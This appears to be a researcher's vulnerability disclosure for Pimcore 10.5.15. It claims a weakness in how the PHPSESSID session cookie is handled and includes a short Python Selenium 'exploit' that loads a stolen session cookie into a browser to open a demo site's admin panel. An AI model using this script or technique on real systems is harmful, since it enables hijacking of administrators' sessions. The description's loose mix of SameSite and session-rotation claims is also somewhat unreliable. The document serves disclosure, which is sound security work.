## [pimcore-10.5.15-Sensitive-Cookie-SameSite-Attribute-vulnerability](https://github.com/pimcore/pimcore/releases/tag/v10.5.15)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/pimcore/pimCore-10.5.15/docs/Screenshot%202023-02-03%20172200.png)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/pimcore/pimCore-10.5.15/docs/Screenshot%202023-01-30%20162715.png)

## [Vendor](https://pimcore.com/en)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/pimcore/pimCore-10.5.15/docs/Screenshot%202023-01-30%20164110.png)

## Description:
The pimCore-10.5.15 suffers from Sensitive Cookies with Improper SameSite Attribute vulnerability - PHPSESSID cookie Session management connection requests are not sanitizing correctly - same session on a couple of computers with different IP's from one network. 
There are no securing changes in PHPSESSID cookies for every request - validating sessions and changing a cookie for every connection - POST Request. 
The attacker in the same network can trick the user - the administrator of this system and can steal his cookie, then he can make very evil things by using the same session from the name of the already authenticated user - administrator, on a couple of PCs with different IPs which are used from different machines into that network. 
When the attacker steals the cookie, he can manipulate the same session, for example, he can log out or do very malicious stuff. This is a very stupid developer's error, and this can be very dangerous for the owner of the system. 
The attack is possible also in the external network!

## Affected versions: 
```
10.5.15
10.5.16
10.5.20
```

## STATUS: HIGH Vulnerability

[+] Exploit:

```Python
#!/usr/bin/python
# @nu11secur1ty
import time
from selenium import webdriver
import colorama
from colorama import Fore, Back, Style

driver = webdriver.Chrome()
print(Fore.BLUE + "Give the PHPSESSID...\n")
print(Style.RESET_ALL)
cookie = input()

driver.maximize_window()
driver.get("https://demo.pimcore.fun/admin/?_dc=1675086863&perspective=")
driver.add_cookie({'name': 'PHPSESSID', 'value': cookie})

print(driver.get_cookie('PHPSESSID'))
driver.get("https://demo.pimcore.fun/admin/?_dc=1675086863&perspective=")

time.sleep(3)

print(Fore.RED + "Your PHPSESSID is PWNED! Please press any key to close the exploit...")
print(Style.RESET_ALL)
input()
quit()


```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/pimcore/pimCore-10.5.15)

## Reference:
[href](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)

[href](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)

## Proof and Exploit:
[href](https://streamable.com/ulanxn)

## Time spent
`00:15:00`

## Writing an exploit
`00:07:00`
